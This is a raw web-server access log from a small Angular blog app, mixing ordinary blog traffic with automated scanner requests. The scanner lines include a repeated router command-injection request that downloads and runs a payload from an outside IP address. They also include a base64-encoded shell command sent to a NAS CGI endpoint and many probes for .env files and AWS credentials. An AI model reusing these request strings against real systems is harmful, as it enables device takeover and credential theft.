[0mGET /favicon.ico [36m304 [0m1.086 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.737 ms - -[0m
[0mGET /favicon.ico [36m304 [0m3.429 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.661 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.759 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.516 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.356 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.839 ms - -[0m
[0mGET /api/blogs [36m304 [0m5.402 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.899 ms - -[0m
[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m0.857 ms - 11156[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.810 ms - 11156[0m
[0mGET /.env [32m200 [0m1.322 ms - 11156[0m
[0mPOST / [32m200 [0m2.321 ms - 11156[0m
[0mGET /.env [32m200 [0m1.207 ms - 11156[0m
[0mPOST / [32m200 [0m1.803 ms - 11156[0m
[0mGET / [32m200 [0m1.344 ms - 11156[0m
[0mGET /.env [32m200 [0m1.287 ms - 11156[0m
[0mPOST / [32m200 [0m1.303 ms - 11156[0m
[0mGET /sendgrid/.env [32m200 [0m1.049 ms - 11156[0m
[0mPOST / [32m200 [0m1.241 ms - 11156[0m
[0mGET / [32m200 [0m1.140 ms - 11156[0m
[0mGET / [32m200 [0m0.799 ms - 11156[0m
[0mGET /.env [32m200 [0m1.563 ms - 11156[0m
[0mPOST / [32m200 [0m1.179 ms - 11156[0m
[0mGET / [32m200 [0m0.849 ms - 11156[0m
[0mGET /favicon.ico [32m200 [0m0.914 ms - 11156[0m
[0mGET /geoserver/web/ [32m200 [0m3.284 ms - 11156[0m
[0mGET / [32m200 [0m0.960 ms - 11156[0m
[0mGET /.env [32m200 [0m0.867 ms - 11156[0m
[0mPOST / [32m200 [0m19.250 ms - 11156[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.663 ms - 11156[0m
[0mGET / [32m200 [0m1.099 ms - 11156[0m
[0mGET /systembc/password.php [32m200 [0m1.169 ms - 11156[0m
[0mGET /phpinfo.php [32m200 [0m1.684 ms - 11156[0m
[0mGET /info.php [32m200 [0m0.984 ms - 11156[0m
[0mGET /phpinfo [32m200 [0m0.997 ms - 11156[0m
[0mGET /php.php [32m200 [0m1.031 ms - 11156[0m
[0mGET /php_info.php [32m200 [0m0.933 ms - 11156[0m
[0mGET /phptest.php [32m200 [0m1.282 ms - 11156[0m
[0mGET /dashboard/phpinfo.php [32m200 [0m0.920 ms - 11156[0m
[0mGET /infophp.php [32m200 [0m0.857 ms - 11156[0m
[0mGET /p.php [32m200 [0m0.901 ms - 11156[0m
[0mGET /_profiler/phpinfo [32m200 [0m1.598 ms - 11156[0m
[0mGET /info.php [32m200 [0m0.851 ms - 11156[0m
[0mGET /pinfo.php [32m200 [0m0.893 ms - 11156[0m
[0mGET /scripts/phpinfo.php [32m200 [0m0.865 ms - 11156[0m
[0mGET /phpinfo.php [32m200 [0m0.994 ms - 11156[0m
[0mGET /admin/phpinfo.php [32m200 [0m0.907 ms - 11156[0m
[0mGET /phpinfo/phpinfo.php [32m200 [0m4.665 ms - 11156[0m
[0mGET /information.php [32m200 [0m1.776 ms - 11156[0m
[0mGET /information [32m200 [0m0.922 ms - 11156[0m
[0mGET /phpinformation [32m200 [0m0.870 ms - 11156[0m
[0mGET /php-info.php [32m200 [0m0.969 ms - 11156[0m
[0mGET /phpversion.php [32m200 [0m0.925 ms - 11156[0m
[0mGET /webdav/phpinfo.php [32m200 [0m0.871 ms - 11156[0m
[0mGET /webdav/phpinfo [32m200 [0m0.917 ms - 11156[0m
[0mGET /webdav/info.php [32m200 [0m0.890 ms - 11156[0m
[0mGET /testphpinfo.php [32m200 [0m0.843 ms - 11156[0m
[0mGET /testphpinfo [32m200 [0m1.704 ms - 11156[0m
[0mGET /admin.php [32m200 [0m0.803 ms - 11156[0m
[0mGET /_phpinfo.php [32m200 [0m0.943 ms - 11156[0m
[0mGET /PHPConf.php [32m200 [0m0.853 ms - 11156[0m
[0mGET /viewinfo.php [32m200 [0m0.889 ms - 11156[0m
[0mGET /info/phpinfo.php [32m200 [0m0.895 ms - 11156[0m
[0mGET /info/info.php [32m200 [0m0.905 ms - 11156[0m
[0mGET /.env [32m200 [0m0.813 ms - 11156[0m
[0mGET /.env.save [32m200 [0m5.843 ms - 11156[0m
[0mGET /.env.old [32m200 [0m0.908 ms - 11156[0m
[0mGET /.env.prod [32m200 [0m0.843 ms - 11156[0m
[0mGET /.env.production [32m200 [0m0.890 ms - 11156[0m
[0mGET /.env.development [32m200 [0m1.077 ms - 11156[0m
[0mGET /laravel/.env [32m200 [0m0.840 ms - 11156[0m
[0mGET /admin-app/.env [32m200 [0m1.187 ms - 11156[0m
[0mGET /api/.env [32m200 [0m0.934 ms - 11156[0m
[0mGET /app/.env [32m200 [0m2.841 ms - 11156[0m
[0mGET /development/.env [32m200 [0m0.785 ms - 11156[0m
[0mGET /apps/.env [32m200 [0m0.923 ms - 11156[0m
[0mGET /.aws/credentials [32m200 [0m1.348 ms - 11156[0m
[0mGET /private/.env [32m200 [0m0.753 ms - 11156[0m
[0mGET /system/.env [32m200 [0m1.390 ms - 11156[0m
[0mGET /docker/.env [32m200 [0m1.135 ms - 11156[0m
[0mGET /cms/.env [32m200 [0m1.435 ms - 11156[0m
[0mGET /script/.env [32m200 [0m1.788 ms - 11156[0m
[0mGET /live_env [32m200 [0m1.009 ms - 11156[0m
[0mGET /application/.env [32m200 [0m0.844 ms - 11156[0m
[0mGET /.env.project [32m200 [0m1.070 ms - 11156[0m
[0mGET /.env.dist [32m200 [0m1.650 ms - 11156[0m
[0mGET /back/.env [32m200 [0m1.529 ms - 11156[0m
[0mGET /core/.env [32m200 [0m1.043 ms - 11156[0m
[0mGET /docker/.env [32m200 [0m1.177 ms - 11156[0m
[0mGET /fedex/.env [32m200 [0m1.781 ms - 11156[0m
[0mGET /local/.env [32m200 [0m0.885 ms - 11156[0m
[0mGET /rest/.env [32m200 [0m1.159 ms - 11156[0m
[0mGET /shared/.env [32m200 [0m2.271 ms - 11156[0m
[0mGET /sources/.env [32m200 [0m1.645 ms - 11156[0m
[0mGET /enviroments/.env.production [32m200 [0m3.406 ms - 11156[0m
[0mGET /enviroments/.env [32m200 [0m0.938 ms - 11156[0m
[0mGET /.env [32m200 [0m0.849 ms - 11156[0m
[0mPOST / [32m200 [0m1.518 ms - 11156[0m
[0mGET /.env [32m200 [0m1.023 ms - 11156[0m
[0mPOST / [32m200 [0m0.876 ms - 11156[0m
[0mGET / [32m200 [0m1.064 ms - 11156[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.723 ms - 11156[0m
[0mGET / [32m200 [0m1.673 ms - 11156[0m
[0mGET /favicon.ico [32m200 [0m0.964 ms - 11156[0m
[0mGET /bloggerApp.js [32m200 [0m0.681 ms - 8831[0m
[0mGET /sitemap.xml [32m200 [0m1.086 ms - 11156[0m
[0mGET /robots.txt [32m200 [0m1.017 ms - 11156[0m
[0mGET /.env [32m200 [0m2.994 ms - 11156[0m
[0mPOST / [32m200 [0m3.215 ms - 11156[0m
[0mGET / [32m200 [0m0.950 ms - 11156[0m
[0mGET /form.html [32m200 [0m1.701 ms - 11156[0m
[0mGET /upl.php [32m200 [0m1.551 ms - 11156[0m
[0mGET /geoip/ [32m200 [0m1.121 ms - 11156[0m
[0mGET /favicon.ico [32m200 [0m1.096 ms - 11156[0m
[0mGET /1.php [32m200 [0m0.968 ms - 11156[0m
[0mGET /bundle.js [32m200 [0m1.055 ms - 11156[0m
[0mGET /files/ [32m200 [0m1.230 ms - 11156[0m
[0mGET /systembc/password.php [32m200 [0m1.490 ms - 11156[0m
[0mGET /password.php [32m200 [0m1.085 ms - 11156[0m
[0mGET /info.php [32m200 [0m1.103 ms - 11156[0m
[0mGET / [32m200 [0m0.921 ms - 11156[0m
[0mGET /.env [32m200 [0m0.782 ms - 11156[0m
[0mPOST / [32m200 [0m1.007 ms - 11156[0m
[0mGET /login [36m304 [0m0.689 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.391 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.375 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.580 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.286 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.285 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.714 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.673 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.583 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.740 ms - -[0m
[0mGET /api/blogs [32m200 [0m6.775 ms - 520[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.624 ms - 11156[0m
[0mGET /.env [32m200 [0m0.797 ms - 11156[0m
[0mPOST / [32m200 [0m0.886 ms - 11156[0m
[0mGET / [32m200 [0m0.826 ms - 11156[0m
[0mGET /.env [32m200 [0m0.919 ms - 11156[0m
[0mPOST / [32m200 [0m0.891 ms - 11156[0m
[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m1.715 ms - 11156[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.906 ms - 11156[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [32m200 [0m0.988 ms - 11156[0m
[0mGET /aaa9 [32m200 [0m0.944 ms - 11156[0m
[0mGET /aab8 [32m200 [0m2.238 ms - 11156[0m
[0mGET / [32m200 [0m1.101 ms - 11156[0m
[0mGET /.env [32m200 [0m1.016 ms - 11156[0m
[0mPOST / [32m200 [0m1.224 ms - 11156[0m
[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m0.859 ms - 11156[0m
[0mGET /api/blogs [36m304 [0m4.294 ms - -[0m
[0mGET /login [36m304 [0m0.634 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.722 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.638 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.173 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.364 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.314 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.294 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.624 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.598 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.665 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.297 ms - -[0m
[0mGET /.env [32m200 [0m1.072 ms - 11156[0m
[0mPOST / [32m200 [0m1.022 ms - 11156[0m
[0mGET /.DS_Store [32m200 [0m1.481 ms - 11156[0m
[0mGET / [32m200 [0m0.717 ms - 11156[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.792 ms - 11156[0m
[0mGET /.env [32m200 [0m1.009 ms - 11156[0m
[0mPOST / [32m200 [0m0.891 ms - 11156[0m
[0mGET / [32m200 [0m0.724 ms - 11156[0m
[0mGET / [32m200 [0m0.783 ms - 11156[0m
[0mGET /login [36m304 [0m0.631 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.378 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.378 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.392 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.473 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.444 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.340 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m2.007 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.351 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.710 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.087 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.499 ms - 518[0m
[0mGET /api/blogs [36m304 [0m4.121 ms - -[0m
[0mGET /.env [32m200 [0m1.007 ms - 11156[0m
[0mPOST / [32m200 [0m21.535 ms - 11156[0m
[0mGET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwktZQlcXHg2NVxceDYzXFx4NjhcXHg2ZlxceDIwXFx4NjhcXHg2NVxceDZjXFx4NmNcXHg2ZlxceDc3XFx4NmZcXHg3MlxceDZjXFx4NjR8c2g= [32m200 [0m1.001 ms - 11156[0m
[0mGET / [32m200 [0m1.692 ms - 11156[0m
[0mGET /.env [32m200 [0m0.885 ms - 11156[0m
[0mPOST / [32m200 [0m0.771 ms - 11156[0m
[0mGET /.env [32m200 [0m1.983 ms - 11156[0m
[0mGET /.env [32m200 [0m2.372 ms - 11156[0m
[0mPOST / [32m200 [0m10.582 ms - 11156[0m
[0mGET /.env [32m200 [0m0.850 ms - 11156[0m
[0mPOST / [32m200 [0m1.473 ms - 11156[0m
[0mGET /login [32m200 [0m1.443 ms - 11156[0m
[0mGET /stylesheets/style.css [32m200 [0m0.937 ms - 111[0m
[0mGET /css/fontawesome-all.css [32m200 [0m1.787 ms - 51609[0m
[0mGET /lib/angular-route.min.js [32m200 [0m2.361 ms - 5720[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.340 ms - 140930[0m
[0mGET /bloggerApp.js [32m200 [0m30.056 ms - 8831[0m
[0mGET /common/nav/navigation.js [32m200 [0m30.274 ms - 823[0m
[0mGET /common/auth/authentication.js [32m200 [0m3.301 ms - 3292[0m
[0mGET /lib/angular.min.js [32m200 [0m2.238 ms - 177366[0m
[0mGET /common/nav/navigation.html [32m200 [0m1.050 ms - 729[0m
[0mGET /favicon.ico [32m200 [0m1.030 ms - 11156[0m
[0mGET /favicon.ico [36m304 [0m0.797 ms - -[0m
[0mPOST /api/login [32m200 [0m32.872 ms - 261[0m
[0mGET /favicon.ico [36m304 [0m0.835 ms - -[0m
[0mGET /favicon.ico [36m304 [0m3.997 ms - -[0m
[0mGET /api/blogs [32m200 [0m7.037 ms - 520[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.585 ms - 518[0m
[0mGET /favicon.ico [36m304 [0m0.636 ms - -[0m
[0mGET /login [36m304 [0m1.397 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.743 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.737 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.346 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.075 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.361 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.430 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.430 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.482 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.407 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.416 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.654 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/comments [32m200 [0m21.925 ms - 684[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m5.670 ms - 684[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m9.102 ms - 698[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.216 ms - 698[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m9.594 ms - 698[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m2.702 ms - 698[0m
[0mGET /api/blogs [32m200 [0m3.858 ms - 700[0m
[0mGET /favicon.ico [36m304 [0m0.932 ms - -[0m
[0mGET /favicon.ico [36m304 [0m3.434 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m7.947 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m5.511 ms - 698[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.659 ms - 698[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m12.995 ms - 698[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.397 ms - 698[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m16.619 ms - 684[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m2.986 ms - 684[0m
[0mDELETE /api/blogs/66147966c15659b60e0ff148/comments/6615b6c3c9d3b5533ecb800a [32m200 [0m8.039 ms - 518[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m11.938 ms - 532[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m2.722 ms - 532[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m9.464 ms - 532[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m2.816 ms - 532[0m
[0mGET /.env [32m200 [0m1.083 ms - 11156[0m
[0mPOST / [32m200 [0m1.675 ms - 11156[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m8.590 ms - 516[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m7.348 ms - 516[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m7.211 ms - 533[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.187 ms - 533[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m8.119 ms - 532[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m5.556 ms - 532[0m
[0mGET /api/blogs [32m200 [0m4.479 ms - 534[0m
[0mGET /favicon.ico [36m304 [0m3.073 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.707 ms - -[0m
[0mGET /favicon.ico [36m304 [0m2.363 ms - -[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.713 ms - 11156[0m
[0mGET / [32m200 [0m0.910 ms - 11156[0m
[0mGET /favicon.ico [32m200 [0m1.117 ms - 11156[0m
[0mGET /sitecore/shell/sitecore.version.xml [32m200 [0m0.836 ms - 11156[0m
[0mGET /api/session/properties [32m200 [0m0.980 ms - 11156[0m
[0mGET / [32m200 [0m0.982 ms - 11156[0m
[0mGET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js [32m200 [0m0.886 ms - 11156[0m
[0mGET /webfig/ [32m200 [0m1.020 ms - 11156[0m
[0mGET /cgi-bin/authLogin.cgi [32m200 [0m0.898 ms - 11156[0m
[0mGET /solr/ [32m200 [0m1.037 ms - 11156[0m
[0mGET /index.jsp [32m200 [0m0.861 ms - 11156[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [32m200 [0m0.973 ms - 11156[0m
[0mGET /identity [32m200 [0m0.930 ms - 11156[0m
[0mGET /js/NewWindow_2_all.js [32m200 [0m0.905 ms - 11156[0m
[0mGET / [32m200 [0m0.859 ms - 11156[0m
[0mGET /showLogin.cc [32m200 [0m0.908 ms - 11156[0m
[0mGET /admin/ [32m200 [0m0.974 ms - 11156[0m
[0mGET /zabbix/favicon.ico [32m200 [0m1.113 ms - 11156[0m
[0mGET /favicon-32x32.png [32m200 [0m1.175 ms - 11156[0m
[0mGET /static/historypage.js [32m200 [0m1.935 ms - 11156[0m
[0mGET /favicon.ico [32m200 [0m1.087 ms - 11156[0m
[0mGET /sugar_version.json [32m200 [0m1.156 ms - 11156[0m
[0mGET / [32m200 [0m0.812 ms - 11156[0m
[0mGET /.env [32m200 [0m1.910 ms - 11156[0m
[0mPOST / [32m200 [0m468.177 ms - 11156[0m
[0mGET /login [36m304 [0m1.391 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.513 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.372 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.220 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.538 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.692 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.115 ms - 9210[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.625 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.709 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.299 ms - 534[0m
[0mPOST /api/blogs [32m201 [0m7.660 ms - 247[0m
[0mGET /api/blogs [32m200 [0m2.664 ms - 782[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.726 ms - 247[0m
[0mGET /api/blogs [36m304 [0m3.750 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.018 ms - -[0m
[0mGET /api/blogs/undefined [33m400 [0m2.395 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.193 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.101 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.055 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.353 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.059 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m3.089 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.908 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.534 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.953 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.728 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.908 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.188 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.354 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.915 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.911 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.947 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.656 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.920 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.334 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.074 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.025 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.969 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.924 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.107 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.585 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.085 ms - 243[0m
[0mGET /login [36m304 [0m0.785 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.378 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.254 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.362 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.166 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.225 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m0.930 ms - 8856[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.571 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.427 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.641 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.154 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.134 ms - 532[0m
[0mGET /api/blogs [36m304 [0m4.220 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.775 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.913 ms - -[0m
[0mGET /login [36m304 [0m1.563 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.370 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.499 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.980 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.854 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.943 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.580 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m2.557 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m2.442 ms - 9305[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.724 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.299 ms - -[0m
[0mGET /login [36m304 [0m0.848 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.673 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.572 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.474 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m2.101 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m3.124 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m4.326 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m6.261 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m10.505 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.595 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.788 ms - -[0m
[0mGET /api/blogs/undefined [33m400 [0m1.106 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.951 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.747 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.087 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.312 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.871 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.952 ms - 243[0m
[0mGET /.env [32m200 [0m1.571 ms - 11156[0m
[0mPOST / [32m200 [0m0.972 ms - 11156[0m
[0mGET /api/blogs/undefined [33m400 [0m1.007 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.915 ms - 243[0m
[0mGET /login [36m304 [0m0.609 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.781 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.944 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.282 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.924 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.866 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.219 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.861 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.950 ms - 9188[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.545 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.600 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.551 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.738 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.233 ms - -[0m
[0mGET /api/blogs/undefined [33m400 [0m0.892 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.033 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.994 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.030 ms - 243[0m
[0mGET /login [36m304 [0m0.755 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.756 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.829 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.421 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.873 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.925 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.020 ms - 9187[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.138 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.608 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.896 ms - -[0m
[0mGET /api/blogs [36m304 [0m9.945 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.955 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.624 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.210 ms - -[0m
[0mGET /login [36m304 [0m0.605 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.396 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.501 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.647 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.795 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m4.920 ms - -[0m
